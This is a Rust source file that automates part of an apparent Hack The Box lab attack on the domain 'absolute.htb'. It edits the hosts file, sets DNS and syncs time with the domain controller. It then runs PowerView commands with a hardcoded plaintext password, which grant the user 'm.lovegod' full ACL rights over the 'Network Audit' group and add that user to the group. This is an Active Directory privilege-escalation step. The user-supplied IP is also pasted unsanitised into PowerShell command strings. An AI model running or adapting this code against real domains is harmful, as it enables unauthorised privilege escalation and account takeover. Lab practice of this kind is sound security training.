use std::process::Command;
use std::io::{stdin, Write};

pub fn update_hosts_file() {
    // Ask the user for the IP address
    print!("Enter the IP address of absolute.htb: ");
    let _ = std::io::stdout().flush();
    let mut ip = String::new();
    stdin().read_line(&mut ip).expect("Failed to read the input");
    let ip = ip.trim();

    // Open the hosts file with administrator privileges
    let output = Command::new("powershell")
        .args(&[
            "-Command",
            &format!(
                "Add-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Value '{} absolute.htb'",
                ip
            ),
        ])
        .output()
        .expect("failed to execute powershell command");

    // Print the command output to the console
    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));
}

pub fn sync_windows_time() {
    let output = Command::new("cmd")
        .args(&["/C", "net", "time", "\\\\absolute.htb", "/set", "/yes"])
        .output()
        .expect("failed to execute net time command");

    // Print the command output to the console
    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));
}

pub fn set_primary_dns() {
    // Ask the user for the IP address
    print!("Enter the IP address of absolute.htb: ");
    let _ = std::io::stdout().flush();
    let mut ip = String::new();
    stdin().read_line(&mut ip).expect("Failed to read the input");
    let ip = ip.trim();

    // Obtain the name of the LAN adapter
    let output = Command::new("powershell")
        .args(&[
            "-Command",
            "Get-NetAdapter -Physical | Where-Object { $_.Status -eq 'Up' -and $_.MediaType -eq '802.3'} | Select-Object -ExpandProperty Name",
        ])
        .output()
        .expect("failed to execute powershell command");

    let adapter_name = String::from_utf8_lossy(&output.stdout).trim().to_string();

    // Set the primary DNS for the LAN adapter
    let dns_output = Command::new("powershell")
        .args(&[
            "-Command",
            &format!(
                "Set-DnsClientServerAddress -InterfaceAlias '{}' -ServerAddresses '{}'",
                adapter_name, ip
            ),
        ])
        .output()
        .expect("failed to execute powershell command to set primary DNS");

    // Print the command output to the console
    let dns_output_str = String::from_utf8_lossy(&dns_output.stdout);
    println!("{}", dns_output_str);
    println!("{}", String::from_utf8_lossy(&dns_output.stderr));
}

pub fn run_powershell_commands() {
    // Prepare and run the PowerShell commands
    let commands = r#"
        Import-Module .\PowerView.ps1
        $SecPassword = ConvertTo-SecureString "AbsoluteLDAP2022!" -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential("Absolute.htb\m.lovegod", $SecPassword)
        Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Network Audit" -Rights all -DomainController absolute.htb -PrincipalIdentity "m.lovegod"
        Add-ADPrincipalGroupMembership -Identity m.lovegod -MemberOf "Network Audit" -Credential $Cred -server absolute.htb
    "#;

    let output = Command::new("powershell")
        .arg("-Command")
        .arg(commands)
        .output()
        .expect("failed to execute PowerShell commands");

    // Print the command output to the console
    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));
}
